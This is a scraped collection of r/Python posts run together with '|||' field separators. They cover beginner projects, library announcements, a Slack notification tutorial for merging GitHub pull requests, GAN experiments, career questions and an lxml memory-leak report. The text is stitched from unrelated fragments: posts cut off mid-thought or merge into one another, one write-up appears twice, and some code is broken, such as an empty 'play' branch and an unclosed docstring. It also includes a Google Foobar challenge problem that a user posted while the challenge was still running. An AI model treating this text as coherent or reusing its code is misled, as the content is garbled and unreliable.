I also added a [custom minifier](https://github.com/Shail-Shouryya/yt_videos_list/blob/master/python/minifier.py) that shrinks the source code to save space, so it takes all the code from the `dev/` directory and strips whitespace and comments before recreating it in the `yt_videos_list` directory. The goal here was to create a kind of minifier similar to the one used by front-end frameworks to shrink the shipped code to minimize bandwidth usage. I realize this isn't something that's typically done in Python, but I figured since most users just `pip install` the package and rarely look at the actual source code, this could be something I could do - it was also kinda fun! 

All this said, I was wondering if there's anything else I can do to make this project better. I'm mainly looking for feedback on design choices and readability, since these 2 things tend to cause the most problems when someone starts working on a new codebase, but if any of you have other feedback I'd love to hear it!

Some additional notes:

 I realize PEP-8 encourages adding line breaks for long lines, but I found the line breaks very annoying and ignored that rule (C0301).

 PEP-8 also has a rule about not having more than 1 statement on 1 line (C0321) and having only 1 space before a variable assignment (C0326), and I ignored these rules too so that all the variable assignments lined up vertically and were easy to find when skimming through the code.

 I also didn't add docstrings for all the non-public functions, classes, and methods (C0114, C0115, C0116) since the point of creating this package was to hide away all the implementation details - I didn't want to explain the things I wanted to abstract away. If someone is looking through these methods and functions though, I made sure to give descriptive names to the variables, functions, and methods so it would be easy to figure out what they do just by looking at the name.

 I'll add support for Linux when I get the chance ""|||Do you need silence to concentrate while coding?|||Python|||1|||40|||1601961216|||""Hey, guys! Im Lisa and I really need an advice of those who work in a noisy atmosphere and need to concentrate while working.

Hello! I want to learn C and got an idea to make a management system as one of my first C projects. But when I thought about it I realized I've never made something like that. So I decided to make a CLI people management system in python first, a language I'm comfortable using.

As I said I've never made something like this so there is a lot of trial and error and I would really appreciate any feedback I can get on how to plan and develop this project further.

The idea is that I have three different abstraction layers, like so:

```
menu.py
~
db_api.py
~
db.json
```

Where `menu.py` is functioning as a view and controller (correct me if I'm wrong). It's kind of the user interface, but with some logic

`db_api.py` is an api that can read/write/update the "database"

And `db.json` is my database, a list with json objects

The project is not done, I am planning on adding the following features:

+ updating a persons properties (name/age at the moment)
+ adding more properties to the person model (last name, job, etc)
+ more ways of searching for people with new properties
+ relationships between people such as friends, father/son etc.

What I'm asking from you is basically any and all feedback on anything regarding project structure, planning, scalability, etc. and also if you think the way that I'm doing things are feasible. Also, please let me know if there are any terms I'm using incorrectly.

Thank you a lot.""|||Beginner stuff.|||Python|||1|||3|||1601935728|||""[removed]""|||Python beginner script help|||Python|||1|||2|||1601935635|||""[removed]""|||Become a Data Scientist (Nanodegree Program)|||Python|||1|||0|||1601933976|||""Software &amp; Analytics colleagues, master the skills necessary to become a successful Data Scientist.

The target market on this library is pretty small, but for all of you out there using [PyCasbin](https://github.com/casbin/pycasbin) for your authorization layer I have created [fastbin](https://github.com/wakemaster39/fastbin).

PyCasbin gets a pretty slow when you are working with large sets of rules in python, we are about 5-10x slower than the go benchmarks. Fastbin stores your rules based on specific indexes for values inside your rules to allow for filtering before trying to resolve enforcement.

This greatly reduces the number of dead rules that have no chance of being a match and greatly increasing the performance of PyCasbin. Working with 10 million rule sets, it is possible to keep enforcement resolution sub millisecond depending on how your cache keys and rules are structured.

This works in conjunction with filter policies which have also been merged now into upstream PyCasbin and the [sqlalchemy-adapter](https://github.com/pycasbin/sqlalchemy-adapter), but I do not know if a release has been generated yet for either.

v1.0.0 should be production ready early next week, I am just validating it against real load now making sure I didn't miss anything as I generalized the code.""|||Discord bots|||Python|||1|||2|||1601896654|||""[removed]""|||My first useful project!|||Python|||1|||0|||1601895292|||""Some time back I was asked if I could provide a script to collect autonomous systems and the connected networks to measure NetFlow traffic.

This is one of them "Has anybody else written it yet" ideas, that has been circling around my head for a few weeks, and perhaps I'm over thinking this, maybe a cron with git pull, then a small script that iterates and tries running everything with .py ext on in a given directory.

I write a lot of ad-hoc scripts for random things,  such as checking if my IP has changed, or checking if some docker-containers are running.  They're the kind of thing you'd run on a cron, any kind of CI/CD would be wwwaaayyyy to over complicated.

But I'm lazy, in the sense I want to code them, and push direct to "prod" without the CI/CD effort (This is for home use after all) - So I thought how cool (and lazy) would it be if there was an automated scheduler and framework, that monitors a git-repository, pulls down updates and new scripts, and just runs them.""|||Information filtering project on Facebook groups using Graph API|||Python|||1|||0|||1601732329|||""So I want to build an application that is able to filter and recognize some keywords in posts from a specific group on Facebook.

2. Is there a library I can import to my python project that could help me manage that data? Like something with functions that go over the data I receive and return a list of the number of times a certain user has used a certain keyword in his post or comments in the group.

Then the bot will broadcast incoming notifications to everybody subscribed.

A system containing cells that interact with each other. Each cells has an energy level. They search for food, kill other cells, reproduce and get ill. So at the end I sum it up every interaction with a chart of the population of the cells (How many of them are dying according to the parameters set).
I encourage you to download the notebook and make experiment with it.
You can change how is likely to find food, the chance of getting ill, and also create other functions like infect other cells when you have a illness, or a symbios function to help find food and better attack other cells.
Run your sim, find your information in it. This is what I call science and what I like to do in my spare time! :)

Automated end-to-end tests are a powerful tool for your team to ship faster and with more confidence. End-to-end tests automate UI interactions and can validate the functionality of your applications. 

To this end, Microsoft has announced [Playwright for Python](https://github.com/microsoft/playwright-python) in preview. Playwright enables developers and testers to write reliable end-to-end tests in Python. Get started by installing [Playwright from PyPI](https://pypi.org/project/playwright/).

* How is Playwright different?    

1. Playwright delivers reliable, timeout-free automation.

2. Playwright is built for the modern web.

3. Playwright works on all modern browsers.

* Where could Playwright be used?    

1. Use Playwright with pytest

2. Use Playwright with Django

3.

This is one of my first Python projects, my only other one of notable size being my poorly-written NCurses RPG. Hello-Bot is a chatbot that starts off knowing how to say "hello" and nothing else. It "learns" from the input of its users by saving each input it receives, as well as saving the input that it was in response to. Example:

Output: Hello  
Input: Hi there!  
\[Saved input "Hi there!" to statement "Hello"\]

The code isn't beautiful, and could probably be optimized in many ways, but I am still happy with it. I have two versions: a CLI-based one-on-one version, and a Discord version. The Discord version is not recommended for large servers, because people will most likely interrupt each other's conversations (though I plan on giving the bot DM capabilities soon).

Anyways, that's all I wanted to share, please enjoy this image of my friend talking to Ollie below:

    foo == 1.2

    foo &gt;= 1.2

    foo

I've been sitting on this code for a while, and mostly everything works (you can take a look at the tests, if you're interested). I've decided to publish it and let the community use it. Hopefully, someone will find some use for it rather than it sitting unpublished. As a result, the final product is not 100% polished, but I'd rather someone have some benefit from this instead of letting it sit on my HDD.

**The Project:**

Another simple project by any standards. This program runs silently in the background and is constantly determining if the user is active or not. If, according to a user-defined interval, it determines that the user is AFK, it will send signal to the computer to keep the computer awake.

**Why not use (or make) a mouse jiggler?**

That was originally my intention. I used the same method of determining whether or not the user was AFK, and then would either violently or subtly jiggle the mouse - this would work for some software, but was unable to trick *Skype for Business.*

In my studies I found that by attaching a USB mouse and running the jiggler it *would* work, but without a USB mouse it simply wouldn't. My hypothesis is that Skype for Business listens for hardware changes and if there's only a trackpad, it must send commands to Windows differently than a USB mouse. Can anyone confirm?

**How it works:**

It listens for keystrokes (without recording or prejudice), and also determines every 0.25seconds if the mouse has changed positions. If it determines that the user is AFK, it will send a keystroke signal of 'F15' to the system.

**GIF In Action:**

Will upload soon :) .

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in late-2020. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be "good at math" to be good at coding.**
* Signing up is the first step.

To do this I had to create start and end point coordinates. Then all you had to do was run a short script where az = 90 - math.degrees(math.atan2(dx, dy)); dx = x2-x1, and dy = y2-y1. The problem is I would get weird output, sometimes changing 90 - to 90 + made no difference at all. At first I thought it was an ArcGIS thing, but I tested it in Visual Studio Code and the Python interpreter and I consistently got the wrong answer, often off by 30. I ended up just doing them with Excel because it gave me the right answer. 

For example:

x1 = 413324

x2 = 413382

y1 = 4050472

y2 = 4050574

dx = 58.12

dy = 101.7

az = 90 - math.degrees(math.atan2(dx, dy)) gives 60.37. However, a quick visual inspection proved that wasn't right. Calculating it in Excel I got 29.74, which matched up much better. And the formula does work. I did it by hand prior with known azimuth values to verify.

It's a simple library to control Sonos with Python! For me, it is pretty useful these days to stop my music at home during my spontaneous Team and Zoom calls.

Here's an example which I quickly wrote:

    import soco 
    import sys
    
    sonos_list = list(soco.discover())
    sonos = sonos_list[0]
    
    if sys.argv[1] == 'play':

    elif sys.argv[1] == 'pause':
        sonos.pause()
    elif sys.argv[1] == 'next':
        sonos.next()
    elif sys.argv[1] == 'previous':
        sonos.previous()
    elif sys.argv[1] == 'vol_up':
        sonos.volume += 10
    elif sys.argv[1] == 'vol_down':
        sonos.volume -= 10

With this, I can run for example:

    python3 script.py pause

[https://gitlab.com/ntjess/utilitys](https://gitlab.com/ntjess/utilitys)

A utility that automatically turns function arguments into parameters, similar to the `interact` capabilities of `ipywidgets`. Unlike the latter, though, this works natively within Qt and doesn't need a notebook / js integration to render. Also, it's much faster and gives a bit more granularity over parameter access.

A decorator, `interact()`, takes all function parameters with default arguments and creates pyqtgraph Parameters out of them, inferring type either (a) by the default type or (b) by the function documentation. You can also specify whether these functions should be run (a) only when a button is pressed, (b) when a parameter is changing, (c) when a parameter is done changing, or any combination of the three.

These can be seen in the example below:

**Why Passgen and not anything else?**  
Simple:  Because of the safemode algorythm. A algorythm which tries to make the  password even more secure, by scanning it (beta testing). Nothing will  be saved outside of your pc. Also it can make bigger passwords than  other programs or websites and i test the algorythm very often and i try  to compare it to other websites/programs, to ensure it's security. Also  a short test is avilable in the README.md on Github. I wanna make it  really good, but this cna take some time and so i will update the  project often :)

A problem now is,  that i don't know if Passgen is faster on better hardware, so it would  be great if someone is able to test it (with like a 10,000,000 char  password on strong and safemode on).

**Features**  
The  password generator itself, password length changer, 3 password security  modes, safemode algorythm, copy-to-clipboard button, info about the  genration process, help documentation (i may have to make it better.  feedback would be great :D) and a short about message.

As  a beginner in Python i'm pretty happy about my project, but any  feedback would be great, so i'm able to work better on the project and  myself :D

Hi all, here is my first project with 200+ lines of code that could be useful for people who post on reddit regularly.

**Why I programmed this:**

I once posted a post on reddit and in the first 2 hours it got 200 upvotes, but then after 2 hours because people could see how many upvotes it had, in 10 minutes it got more than 100 upvotes!

I  was amazed that once people saw how many upvotes it got, they tended to  upvote it even more. So that inspired me to write a python code to collect data of a post every x minutes for \~3 hours to see the effects for myself and have the data on an excel sheet.

**Technical stuff:**

So this program uses the PRAW module to collect data from reddit. It gets the ID of the post from it's comments section's url and uses that id to  access the post in every cycle.

Code is here:

[https://github.com/KungfuSnail/getRedditData/blob/master/singlePostAnalysis.py](https://github.com/KungfuSnail/getRedditData/blob/master/singlePostAnalysis.py)

The console while the code is running:

[https://imgur.com/a/KbN154t](https://imgur.com/a/KbN154t)

Here is what the output file looks like:

[https://imgur.com/a/ce8HtrX](https://imgur.com/a/ce8HtrX)

Notes:

1. When  you want to collect data from reddit, you need to make a bot in order  to do so. If you want to use this code for yourself but aren't familiar  with PRAW, I made a bot for anyone to use (it's not connected my email  or accounts on reddit). So you can just use mine and you don't have to  make one. (But if you want to, this link will help you alot: [https://www.reddit.com/prefs/apps/](https://www.reddit.com/prefs/apps/))
2. I  wanted everyone to be able to try this even with their phones so I put  the code on repl. But I can't download the output excel file myself and I  don't know why, I'll paste the link here anyway in case anyone could  find a way to actually download the output. (Run the code first to get  the output file in the folder)    [https://repl.it/@KungfuSnail/OnePostData#main.py](https://repl.it/@KungfuSnail/OnePostData#main.py)
3. There  is a part 2 coming soon that collects the data of the first X (say 200)  posts that are posted after you run the program, and it saves all their  data to the excel sheet. (See here: [https://imgur.com/a/bQDnprX](https://imgur.com/a/bQDnprX))
4. Any  recommendations appreciated! I'm new so it can be anything. Bad  formatting in my code? Should I delete the bot I created because someone  can do something illegal with it and I'll be responsible? I learned  github because of this project so any cool pages you follow on github or  any tips are welcomed.

arXivist is easy to set up, requiring only Bash &amp; Docker to get started - and easy to use, simply entering the app should be enough to understand how it works!

Directory Size Monitor is a tool that can show the user what are some biggest files and directories on the file system, as well as some biggest size changes of files and directories over a period of time.

I was initially motivated to start this project because I couldn't sort the size of directories on Windows, as directory sizes are hidden in the File Explorer. Later on I figured it'll be useful to compare a same directory between two different times, to find out what has changed on the file system. So I added that as a second feature.

Thus I've spent several hundred hours (as I was learning Flask and JavaScript simultaneously) building this free site that allows you to essentially plan your life anywhere from days to decades, getting a visual overview of your lifetime.

You can:

* Shade 'boxes' of your life and give them meanings
* Set goals for yourself and color them based on progress
* Download images of your own life in weeks/months/years
* Jot down what you've done in specific days/weeks/months/years/decades... or what you plan to do!

The site is also completely free, despite hosting + database costs. Likewise, it is open-source - contributions are welcome!

*This is my first post in* /r/Python *and hopefully not the last. Please give me feedback.*

In the next 10 minutes you will create an automation that sends you a Slack message when your Github Pull Request is approved with a button to merge it in one click.

It is written in Python, does not require any infrastructure, and is free to run (using free tiers of services involved).

*I hate notifications and disable them any chance I get. One day I realized that notifications from GitHub are not working well for methey go to email that I read infrequently and it is hard to make them about what I actually care for, so I spent a morning developing my own notifications from GitHub. It was one of the best investments of my time, and now I want to share it with you.*

If you use Github pull requests, creating this automation will pay off almost immediately. You will also learn how to build custom Slack notifications.

The automation consists of three parts:

1. **Notification Function**a Python function that sends a Slack message when triggered by a Github Webhook.
2. **Action Function**a Python function that merges the PR when you click a button.
3. **Github Connection** using a webhook and an API key.

You will need:

1. Permission to add webhooks to your github repository.*This can be done without webhooks, but is more complicatedif you want to know how, let me know in the comments.*
2. Ability to add Slack applications to your workspace.

Lets get started!

# Step 1: Create Notification Function

To glue Github and Slack together, well use NotiFunctiona service for creating custom Slack notifications with code (*a service I helped build*).

Go to [app.notifunction.com](https://app.notifunction.com/)it will connect your Slack workspace right away and ask to select language. Select Python.

&amp;#x200B;

Go through the onboarding or skip it if you feel confident.

Then, create a new notification. Lets call it Approved PR:

&amp;#x200B;

https://preview.redd.it/oyt6qo46t3q51.png?width=1228&amp;format=png&amp;auto=webp&amp;s=e5afe588d480d2c16323197a80a64f2c96d7e1f9

Enter this code for the notification function, replacing &lt;your github username&gt; and &lt;email in your Slack profile&gt; with your data.

*Note: One check in this code is commented outwe will bring it back when we connect real data from GitHub.*

    MY_GITHUB_USERNAME = '&lt;your github username&gt;'
    MY_SLACK_EMAIL = '&lt;email in your Slack profile&gt;'
    def handler(input_data):
        """Handler is called when a GitHub Event happens
        List of events and payloads:

        """
        if input_data.get('X-GitHub-Event') == 'pull_request_review':
            pr_is_approved = input_data['review']['state'] == 'approved'
            pr_is_mine = input_data['pull_request']['user']['login'] == MY_GITHUB_USERNAME
            ### We will uncomment this line after testing is done
            # if pr_is_approved and pr_is_mine:
            if True:
                return _build_message(input_data)
            
    def _build_message(input_data):
        """Constructs a Slack message made out of Slack Blocks

        reviewer = input_data['sender']['login']
        pr_url = input_data['pull_request']['url']
        pr_title = input_data['pull_request']['title']
        
        message = (
            f':white_check_mark: {reviewer} just approved your pull request '

        )
        
        return {
            'to': MY_SLACK_EMAIL,
            'blocks': [{
            'type': 'section',
                'text': {

                }
            }]
        }

Code in this snippet checks that event represents an approved PR, that its your PR, and sends you a Slack notification (without a buttonwell add it on the next step).

This and further code is also available in [this gist](https://gist.github.com/alice-engi/d4004ef6a1dad8fd8f6c3f0133554145).

# Step 1a: Test Notification Function

Lets test the function using mock data. You can find mock event data here:  [sample-input.json](https://gist.github.com/alice-engi/d4004ef6a1dad8fd8f6c3f0133554145#file-sample-input-json).

Click Input at the bottom of the screen and enter the mock data.

Click Test Notification

&amp;#x200B;

https://preview.redd.it/230f3fm9t3q51.png?width=1504&amp;format=png&amp;auto=webp&amp;s=2707c391b2dbb89c9814f3411b61af3f58767388

You should see a message like this:

&amp;#x200B;

https://preview.redd.it/2nf5dl8bt3q51.png?width=1312&amp;format=png&amp;auto=webp&amp;s=ec06e186acd8f1ef9e76f05ad82a507a690e8e57

# Step 2: Create Merge PRButton

To add a button to your notification, go back to the notification overview page and press Create Action.

&amp;#x200B;

https://preview.redd.it/865b78bct3q51.png?width=1504&amp;format=png&amp;auto=webp&amp;s=09ef130263798a77b0bbc46f7a38b84e612c6218

Copy this code for the action function. Dont mind the &lt;api token&gt; placeholder for nowwell fill it in the next step.

    import requests
    
    # Get it here https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token
    GITHUB_API_TOKEN = '&lt;api token&gt;'
    
    def handler(input_data):
      repo = input_data['trigger']['repository']['full_name']
      pr_number = input_data['trigger']['pull_request']['number']
      
      # Send API request to merge the PR
      response = requests.put(
        f'https://api.github.com/repos/{repo}/pulls/{pr_number}/merge',
        json={
            'merge_method': 'squash',
        },
        headers={
            'Authorization': f'token {GITHUB_API_TOKEN}'
        }
      )  
      
      if response.status_code == 200:
          return 'Your PR was merged successfully!'
      else:
          return f'Error merging PR: {response.json()["message"]}'

# Step 2a: Test ActionFunction

To test the button, send a test notification again. The message will look like this:

&amp;#x200B;

https://preview.redd.it/ppcrfi3et3q51.png?width=1328&amp;format=png&amp;auto=webp&amp;s=e99de956c1a6db4074b7dc564693957a38719e64

Try clicking the buttonyoull see Bad Credentials messageit is fine since we did not connect the code to GitHub yet.

# Step 3: Connect toGithub

We will do two things with GitHub:

1. Set up a webhook that will send events to the notification function.
2. Get API key to use when merging PR.

First, copy the trigger URL of your notification from the overview page:

&amp;#x200B;

https://preview.redd.it/un2qy05ht3q51.png?width=1756&amp;format=png&amp;auto=webp&amp;s=0fdc7b27dbb04a7a0137e8358f0b75488f603358

Then, go to the Settings =&gt; Webhooks section of your GitHub repository.

&amp;#x200B;

https://preview.redd.it/8w178zrit3q51.png?width=1178&amp;format=png&amp;auto=webp&amp;s=8149ef1430c4b6e29ace63e4687c8b9c546f20c9

Add a new webhook with the URL you copied on the previous step.

&amp;#x200B;

https://preview.redd.it/dym7uv4fu3q51.png?width=910&amp;format=png&amp;auto=webp&amp;s=13a7979e23a4344e8db66d505a1bd1adf083306e

I recommend sending only Pull Request Review requests to the webhook to reduce noise in logs:

&amp;#x200B;

https://preview.redd.it/lvrla4egu3q51.png?width=766&amp;format=png&amp;auto=webp&amp;s=e33845a66e1977c7c4b4d32f104323721c358f83

&amp;#x200B;

https://preview.redd.it/de8q1iohu3q51.png?width=542&amp;format=png&amp;auto=webp&amp;s=cd4079b86d213665b4caada7f107c1c97853e8fb

After this step, Pull Request Review events will be trigger your notification function and you will see them in the Recent Activity section in the UI.

Now, lets get your GitHub Access Token. Just follow the instructions here: [https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token](https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token).

Make sure to add repo scope to your token:

&amp;#x200B;

https://preview.redd.it/1gc8lf1ku3q51.png?width=1044&amp;format=png&amp;auto=webp&amp;s=16831903392cd027911cc87cadda570714448927

When you get the token, copy it and paste into the Action Function:

    GITHUB_API_TOKEN = '&lt;api token&gt;'

# Conclusion

Now you can uncomment the check in your notification function:

    if pr_is_approved and pr_is_mine:
        return _build_message(input_data)

You are done! Now ask someone to review your PR and youll receive a notification, and will be able to merge PR right from Slack.

If you experience any problems in the processlet me know in comments.

This is a very basic version of the notification. You can change its logic, formatting, add more buttons, etcits all just code.

So, I found GANs when I was taking up Andrew Ng's Introduction to Machine Learning Course and wanted to implement it in PyTorch but, I don't know how to implement it in PyTorch. So, I searched for GAN implementation on YouTube and found a video by [Ayush Chaurasia](https://www.youtube.com/c/AyushChaurasia) where he implemented [Generative Adversarial Network](https://www.youtube.com/watch?v=aZpsxMZbG14) from the original research paper in PyTorch. His video is the only reason why this code is here and it's very similar to his code.

I then trained the GAN with FashionMNIST dataset and got pretty good results in 30 epochs but I wanted to test it out on a different dataset. Then I searched on Kaggle but most of the datasets are above 300 Mb. So, I decided not to download them because I am too lazy.

&amp;#x200B;

Then as usual I was binge-watching YouTube and found a video by jabrils where he implements Auto Encoders. He uploaded the pokemon dataset to kaggle which is about 80 Mb and I downloaded it and trained it on Google Colab. After 300 iterations the result looks like trash. The newly generated pokemon can only be seen when you imagine its shape and edges xD.  I also trained the model using dbz dataset but the results were pretty much the same.

&amp;#x200B;

I left this project for 2 days until I found a video about GAN's in my suggestions on YouTube. The channel name is [AngryCoder](https://www.youtube.com/channel/UCta6mmYG1NLeDeFFaLP2eug). He trained a GAN and it generates Sharingans. So, I thought of implementing the same. I scraped images of Sharingans from a couple of websites then resized them to 128x128 and uploaded them as a zip to Google Colab. In fact, I took the name of this repo from his video.

Here's the result:

How do I fight the feeling?

It mostly comes down to the gap in code quality between open source projects I've been using and contributing to, and corporate projects that I have to work on. Sadly, my co-workers on the last 3 jobs I took consistently refused, or sabotaged any attempt at improving code quality:

\- Best practices are never taken seriously (eg.: LBYL instead of EAFP, abusing isinstance(), 5 or 6 levels of nested loops with side effects are generally considered acceptable, "\*" star imports everywhere... these are only the most common issues I see). Blocks of 50+ lines of imperative code are consistently preferred over more declarative code.

\- Tooling (flake8, black, mypy, mccabe) is refused by some people, who will ignore lint warnings and just push code, on the grounds "a programming language should be self sufficient and not require tooling to fit community standards, tools are easy to circumvent, and don't magically produce proper code anyway.". Once you reach 500+ unique lint warnings, it's too late to restore a hard check in CI.

\- Any attempt at refactoring will be shot down as changes to "working" code might temporarily lower team productivity while everyone adapts. I've seen this mentioned on pull requests as trivial as "use dataclass \_\_post\_init\_\_() instead of manually calling a data validation method after init" or "use (str, Enum)".

\- At least we have some unit tests , yay? Unfortunately, no one trusts them enough to allow refactoring that properly passes unit tests.

I feel like everyone I've been talking to recently actually hates Python, as in they trying very hard to circumvent what makes Python great. Me, I still love Python.

Unfortunately, it seems that's my very love for Python that makes me completely unfit to work in this industry.""|||Transcribe zoom meetings with zoom_audio_transcribe!|||Python|||1|||2|||1601369244|||""Hey  Folks, so some days ago I thought it would be cool if we have the  ability to transcribe Zoom Meetings.

I am actually a beginner in python. Dived into python like 2.5 months ago and completed my first book, Head first python 2e. 
If you arent familiar with the book, it introduces flask to help learn python after covering the basics. 
The app I made isnt that big of an achievement i think, more about just getting the concepts down. 

I am about to start my second book which deals with Django. The book is called Django 3 by example and has about 4 projects that takes a novice to intermediate-expert level by the end of the book. 

My problem, or query more like, is how do I get a job in python industry. The reason I picked Django to learn is to land a job in the industry within the next 4 months. I start applying for jobs as soon as i finish 2 out of 4 projects in the book. 
Is my thought process viable? Can i actually get an entry level job after just completing 4 django projects? 

I would really appreciate if you guys could tap into your experience(work or otherwise) to guide me towards the stage i am aiming for, for now. 

I have other books on my list to improve my python skills, but i was really hoping to get a decent job while i study those, in order to start making some money. Something stable to help me launch my career. 

This conversion from learning from books to landing a job is like wandering in the dark for me. How do i go about this? 

Any thoughts/comments are appreciated.

Just randomly got a link yesterday to do some challenge question. Completed level 1 without breaking a sweat. Level 2 seems easy too but my code satisfies all the test cases that I can think of except for google(even the non hidden ones), and I have 1 day left. (long post ahead)

Problem: 

Power Hungry
============

Commander Lambda's space station is HUGE. And huge space stations take a LOT of power. Huge space stations with doomsday devices take even more power. To help meet the station's power needs, Commander Lambda has installed solar panels on the station's outer surface. But the station sits in the middle of a quasar quantum flux field, which wreaks havoc on the solar panels. You and your team of henchmen have been assigned to repair the solar panels, but you'd rather not take down all of the panels at once if you can help it, since they do help power the space station and all!

You need to figure out which sets of panels in any given array you can take offline to repair while still maintaining the maximum amount of power output per array, and to do THAT, you'll first need to figure out what the maximum output of each array actually is. Write a function solution(xs) that takes a list of integers representing the power output levels of each panel in an array, and returns the maximum product of some non-empty subset of those numbers. So for example, if an array contained panels with power output levels of [2, -3, 1, 0, -5], then the maximum product would be found by taking the subset: xs[0] = 2, xs[1] = -3, xs[4] = -5, giving the product 2*(-3)*(-5) = 30.  So solution([2,-3,1,0,-5]) will be "30".

Each array of solar panels contains at least 1 and no more than 50 panels, and each panel will have a power output level whose absolute value is no greater than 1000 (some panels are malfunctioning so badly that they're draining energy, but you know a trick with the panels' wave stabilizer that lets you combine two negative-output panels to produce the positive output of the multiple of their power values). The final products may be very large, so give the solution as a string representation of the number.

Languages
=========

To provide a Python solution, edit solution.py
To provide a Java solution, edit Solution.java

==========
Your code should pass the following test cases.

\# Dataset

I scraped bunch of images from different websites and then resized them to 128x128 size. This dataset consists of 56 images and this was the reason why it took 10 minutes to train.

\# Why did I write this code?

I started learning PyTorch from the past 10 days. Fortunately, I found a very intuitve playlist on YouTube by deeplizard. Honestly, those videos are dope. \[Here's the link.\]([https://www.youtube.com/playlist?list=PLZbbT5o\_s2xrfNyHZsM6ufI0iZENK9xgG](https://www.youtube.com/playlist?list=PLZbbT5o_s2xrfNyHZsM6ufI0iZENK9xgG)) I wanted to test out with something interesting.

&amp;#x200B;

I found GANs when I was taking up Andrew Ng's Introduction to Machine Learning Course and wanted to implement it in PyTorch but, I don't know how to implement it in PyTorch. So, I searched for GAN implementation on YouTube and found a video by \[Ayush Chaurasia\]([https://www.youtube.com/c/AyushChaurasia](https://www.youtube.com/c/AyushChaurasia)) where he implemented \[Generative Adversarial Network\]([https://www.youtube.com/watch?v=aZpsxMZbG14](https://www.youtube.com/watch?v=aZpsxMZbG14)) from the original reasearch paper in PyTorch. His video is the only reason why this code is here and it's very similar to his code.

&amp;#x200B;

I then trained the GAN with FashionMNIST dataset and got pretty good results in 30 epochs but I wanted to test it out on a different dataset. Then I searched on Kaggle but most of the datasets are above 300 Mb. So, I decided not to download them because I am too lazy. Then as usual I was bingewatching YouTube and found a video by jabrils where he implements Auto Encoders. He uploaded pokemon dataset to kaggle which is about 80 Mb and I downloaded it and trained it on Google Colab. After 300 iterations the result looks like trash. The new generated pokemon can only be seen when you imagine its shape and edges xD. I left this project for 2 days until I found a video about GAN's in my suggestions on YouTube. The channel name is \[AngryCoder\]([https://www.youtube.com/channel/UCta6mmYG1NLeDeFFaLP2eug](https://www.youtube.com/channel/UCta6mmYG1NLeDeFFaLP2eug)). He trained a GAN and it generates Sharingans. I then went to the description box and did not find any link to his code. So, I thought that I should implement this. I scraped images of Sharingans from couple of websites then resized them to 128x128 and uploaded as a zip to Google Colab. In fact, I took the name of this repo from his video.

&amp;#x200B;

Honestly, if I did not find these YouTube videos, I would've never implemented this code. Huge shoutout to them.

I am a freshman in college and currently want to be a programmer and am taking intro computer science and math classes

The math classes are going well and the programming was going extremely well, but recently we have begun looping and it is far less intuitive to me than the previous material

Everything until this point (Booleans, operands, operations, types, output formatting, lists, tuples, dicts, if-then, etc) was very very intuitive to me and I got it almost immediately. 

Looping however I am really struggling through and need to compile like a million times before eventually getting it right.

Does this mean that I should re-evaluate whether or not programming is the correct career for me? It feels like test 2 material in the intro class is a pretty early point to start to feel sluggish if I'm going to make a career out of it

I managed to host it on a free heroku dyno a couple of days ago and It's working quite well. I would really appreciate any feedback about performance or the code itself if anyone wants to try. Any kind of feedback is appreciated.

&amp;#x200B;

I know there are far better free options than mine, but It's still nice to have something similar to the good one made by myself.

Instead they rely on ACLs and/or HTTP basic auth.

This is because I desperately want to avoid rolling my own authentication and authorization, as it's very easy to f\*ck up and the consequences can be huge. Also, every time I have done this in the past, I have felt like this must have been done a million times before. Surely there must be loads of good mature, secure open source Python libraries that does most of this for me?

But alas, my Google-fu must really suck, because I come up mostly dry every time I search. 

My needs:

* Handle user login (username + password (+ 2FA?))
* Have a system for giving users privileges or assign them to groups with privileges
* Hooks for checking the current user's privileges
* Be web framework independent (but built-in integrations for popular web frameworks is a bonus)
* Preferably thousands of stars on Github so I can be reasonably certain it doesn't have obvious and serious security issues

But now I want to move my display to an actual GUI and I've decided (after seeing the recommandations on [this post](https://www.reddit.com/r/Python/comments/gxsb8v/i_created_a_gui_that_collates_various_interests/)) to basically make a webpage running on a Flask server to create a basic GUI.

While I have some experience with HTML and CSS, I only know how to create a "static" webpage and I would like to know how can I make a dynamic webpage that is **constantly updated (when information on the backend is updated)** without user interaction: ie if my Spotify track changed, the display on the dashboard/page should reflect the changes accordingly. I've looked into jQuery/AJAX but it seems that the only way to do it is by having elements on a refresh timer (let's say every 100ms) and reload them every time. This doesn't seem like the best idea, and also I don't know what's the best practice for it either. For example I don't want to refresh something that hasn't changed (especially if I'm reloading the HTML from disk)

I am posting to document my experience and my solution.

My Python project involves processing a lot of XML data, and the community consensus pointed me in the direction of LXML. I started a lengthy run over a terabyte of XML documents, and to my surprise, it crashed overnight with a memory-related message. I checked the macOS Activity Monitor and found that Python was consuming 8 *gigabytes* of RAM.

I tried a lot of things - profiling my code, examining it for stray reference cycles, explicitly deleting big objects after use instead of letting the garbage collector handle them. Nothing worked.

Eventually, I was led to conduct some research on LXML itself, and I found a lot of posts like these:

* [Tracking Down a Freaky Python Memory Leak (Part 2)](https://benbernardblog.com/tracking-down-a-freaky-python-memory-leak-part-2/)

* [lxml memory usage when parsing huge xml in python](https://stackoverflow.com/questions/6418576/lxml-memory-usage-when-parsing-huge-xml-in-python)

* [python-lxml causes memory leak](https://bugzilla.redhat.com/show_bug.cgi?id=727426)

* [Thought I should share: lxml.etree leaks memory and I wrote some code to clear it up](https://www.reddit.com/r/Python/comments/82ijsw/thought_i_should_share_lxmletree_leaks_memory_and/)

* [Spoiler alert, the leak is in libxml2, not Python code](https://news.ycombinator.com/item?id=13123995)

